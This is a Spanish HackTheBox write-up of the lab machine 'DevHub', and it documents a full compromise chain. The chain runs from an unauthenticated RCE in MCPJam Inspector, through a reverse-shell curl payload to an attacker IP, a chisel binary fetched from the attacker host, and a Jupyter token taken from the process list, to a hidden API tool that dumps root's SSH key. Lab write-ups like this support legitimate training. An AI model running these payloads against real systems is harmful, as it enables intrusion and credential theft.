---
title: "🧩 DevHub — HackTheBox Writeup"
machine: "DevHub"
platform: "HackTheBox"
os: "Linux"
difficulty: "Unknown"
tags: ["CVE", "RCE", "Privesc", "Web"]
retired: true
summary: "DevHub es una máquina Linux de dificultad Medium centrada en tecnologías MCP (Model Context Protocol) de Anthropic. La cadena de ataque involucra explotar una h"
draft: false
---
**Autor:** 4Pr3nd1z

**Dificultad:** Medium

**OS:** Linux

**Fecha:** 30 Mayo 2026

**Estado:** ✅ Pwned

---

## 📋 Índice

---

## 🌐 Descripción General

DevHub es una máquina Linux de dificultad **Medium** centrada en tecnologías **MCP (Model Context Protocol)** de Anthropic. La cadena de ataque involucra explotar una herramienta de desarrollo expuesta públicamente, abusar de SSRF para alcanzar servicios internos, y explotar una API interna con herramientas ocultas para conseguir acceso root.

**Stack tecnológico:** Node.js · Python 3 · Jupyter Lab · MCP Protocol · nginx · Ubuntu 24.04

---

## 🔍 Reconocimiento

### Escaneo de puertos

```bash
sudo nmap 10.129.6.105 -p- --open --min-rate 5000 -Pn -n -oG target
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6274/tcp open  unknown
```

### Escaneo de versiones

```bash
sudo nmap 10.129.6.105 -p 22,80,6274 -sCV -Pn -oN targeted
```

| Puerto | Servicio | Versión |
| --- | --- | --- |
| 22 | SSH | OpenSSH 8.9p1 Ubuntu |
| 80 | HTTP | nginx 1.18.0 → `devhub.htb` |
| 6274 | HTTP | **MCPJam Inspector** |

> 💡 El puerto 6274 reveló en su fingerprint el título `MCPJam Inspector` — herramienta de desarrollo MCP.
> 

### Virtual Host

```bash
echo "10.129.6.105 devhub.htb" | sudo tee -a /etc/hosts
```

---

## 🔎 Análisis de Servicios

### Puerto 80 — DevHub

La página principal es un portal interno que revela información crítica sobre la infraestructura:

| Servicio | Ubicación | Estado |
| --- | --- | --- |
| MCP Inspector | Puerto 6274 | ✅ Activo |
| **Jupyter Notebook** | **localhost:8888** | 🔒 Solo interno |
| Git Repository | Desconocido | 🔧 Mantenimiento |

### Puerto 6274 — MCPJam Inspector v1.4.2

Extracción de endpoints del JS minificado:

```bash
curl -s http://10.129.6.105:6274/assets/index-DRYhT9Xb.js | \
  grep -oP '["'"'"'][/][a-zA-Z0-9_/-]+["'"'"']' | sort -u
```

Endpoints relevantes encontrados:

```
/api/mcp/connect
/api/mcp/tools/list
/api/mcp/tools/execute
/api/mcp/resources/list
/api/mcp/servers
```

> ⚠️ La versión **1.4.2** es vulnerable al **CVE-2026-23744** — RCE sin autenticación.
> 

---

## 💥 RCE via MCPJam Inspector — Acceso Inicial

### Descubrimiento del vector

Al explorar la UI del MCPJam Inspector, se identificó que el endpoint `/api/mcp/connect` acepta configuraciones de servidor con tipo **STDIO**. Este tipo ejecuta un proceso local en el servidor con los argumentos suministrados por el atacante — sin ninguna validación.

### Payload

```bash
# Terminal 1 — Listener
nc -lvnp 4444

# Terminal 2 — Exploit
curl -s -X POST http://10.129.6.105:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverId": "pwn",
    "serverConfig": {
      "type": "stdio",
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.15.55/4444 0>&1"]
    }
  }'
```

### Por qué funciona

El MCPJam Inspector, al recibir un `serverConfig` con `type: stdio`, ejecuta internamente:

```jsx
spawn("bash", ["-c", "bash -i >& /dev/tcp/10.10.15.55/4444 0>&1"])
```

No existe ninguna validación del comando ni whitelist de binarios. El diseño asume que solo el desarrollador local tiene acceso, pero el servicio escucha en `0.0.0.0:6274`.

### Shell obtenida

```
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

### Estabilización de la shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 🕵️ Enumeración como mcp-dev

### Archivos interesantes

```bash
cat /opt/mcpjam/node_modules/@mcpjam/inspector/.env.production
```

```
VITE_WORKOS_CLIENT_ID=client_01K4C1TVPBE7JTBFQJF9SDW9P9
CONVEX_URL=https://outstanding-fennec-304.convex.cloud
```

> No son útiles directamente para el CTF, son credenciales del servicio cloud de MCPJam.
> 

### Token de Jupyter en ps aux

```bash
ps aux | grep jupyter
```

```
analyst  1025  /home/analyst/jupyter-env/bin/python3 ... jupyter-lab
         --ip=127.0.0.1 --port=8888
         --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

**Token encontrado:** `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`

### Servicio OPSMCP

```bash
ps aux | grep opsmcp
# root 1033 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py

ss -tlnp | grep 5000
# 127.0.0.1:5000 — OPSMCP API
```

### Infraestructura interna descubierta

```
localhost:8888  → Jupyter Lab (usuario: analyst)
localhost:5000  → OPSMCP API (Flask, requiere X-API-Key)
```

---

## 🔓 Escalada a analyst via Jupyter

### Port Forwarding con Chisel

**Kali — servidor Chisel:**

```bash
./chisel server --reverse --port 1234
```

**Víctima — cliente Chisel:**

```bash
curl http://10.10.15.55:8000/chisel -o /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel client 10.10.15.55:1234 R:8888:127.0.0.1:8888 R:5000:127.0.0.1:5000
```

### Acceso a Jupyter Lab

```
http://127.0.0.1:8888/?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Desde la **Terminal** integrada en Jupyter Lab:

```bash
id
# uid=1002(analyst) gid=1002(analyst)

cat ~/user.txt
# 08417ab1c3777ae401078aba6059b6b2 ✅
```

---

## 👑 Escalada a root via OPSMCP

### Análisis de /opt/opsmcp/server.py

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Herramientas visibles (en /tools/list)
VISIBLE_TOOLS = {
    "ops.system_status": ...,
    "ops.list_services": ...,
    "ops.check_disk": ...,
    "ops.view_logs": ...
}

# Herramientas OCULTAS (no en /tools/list pero ejecutables)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": ...
}
```

> 🔑 La herramienta `ops._admin_dump` con `target=ssh_keys` lee `/root/.ssh/id_rsa`
> 

### Extracción de la clave SSH de root

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
```

Respuesta:

```json
{
  "root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n...",
  "target": "ssh_keys",
  "note": "Emergency recovery key dump"
}
```

### Acceso SSH como root

```bash
# Guardar la clave
cat > /tmp/root_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
[CLAVE PRIVADA]
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 /tmp/root_key
ssh -i /tmp/root_key root@10.129.6.105
```

```bash
cat /root/root.txt
# c20aace6bf3b41938a5b4023f67eb59a ✅
```

---

## 🏁 Flags

| Flag | Hash |
| --- | --- |
| 🧑 user.txt | `08417ab1c3777ae401078aba6059b6b2` |
| 👑 root.txt | `c20aace6bf3b41938a5b4023f67eb59a` |

---

## 🗺️ Resumen de la Cadena de Ataque

```
Nmap → Puerto 6274 (MCPJam Inspector v1.4.2)
         │
         ▼
Extracción de endpoints del JS minificado
         │
         ▼
/api/mcp/connect + type:stdio → RCE → shell como mcp-dev
         │
         ▼
ps aux → Token Jupyter + puerto 5000 (OPSMCP)
         │
         ▼
Chisel port forwarding → Jupyter en navegador
         │
         ▼
Terminal Jupyter → shell como analyst → user.txt ✅
         │
         ▼
/opt/opsmcp/server.py → API Key + herramienta oculta _admin_dump
         │
         ▼
ops._admin_dump (target=ssh_keys) → /root/.ssh/id_rsa
         │
         ▼
SSH como root → root.txt ✅
```

---

## 📚 Lecciones Aprendidas

### Técnicas nuevas

**MCP Protocol (Model Context Protocol)** — Protocolo de Anthropic para conectar LLMs con herramientas externas. Tiene 3 tipos de transporte: STDIO, HTTP y SSE. El tipo STDIO ejecuta procesos locales directamente.

**MCPJam Inspector** — Herramienta de desarrollo para depurar servidores MCP. Por diseño escucha en todas las interfaces (`0.0.0.0`), lo que lo hace crítico si se expone al exterior.

**SSRF via MCPJam** — El endpoint `/api/mcp/connect` hace requests hacia la URL proporcionada. Confirmar SSRF analizando los mensajes de error (403 de Jupyter = el servidor llegó al destino interno).

### Conceptos reforzados

- Extracción de endpoints de JS minificado con grep + regex
- Chisel para port forwarding cuando no hay credenciales SSH
- Token de Jupyter expuesto en argumentos de proceso (`ps aux`)
- Herramientas ocultas en APIs — siempre revisar el código fuente cuando sea accesible
- `.env.production` en directorios de aplicaciones Node.js

### Comandos clave recordar

```bash
# Extraer endpoints de JS
curl -s http://TARGET/assets/app.js | grep -oP '["'"'"'][/][a-zA-Z0-9_/-]+["'"'"']' | sort -u

# Token Jupyter en procesos
ps aux | grep jupyter

# Chisel tunnel
./chisel server --reverse --port 1234
/tmp/chisel client KALI_IP:1234 R:PORT:127.0.0.1:PORT

# OPSMCP con herramienta oculta
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: KEY" \
  -d '{"name": "HIDDEN_TOOL", "arguments": {...}}'
```

---

*Writeup por **4Pr3nd1z** — Mayo 2026*
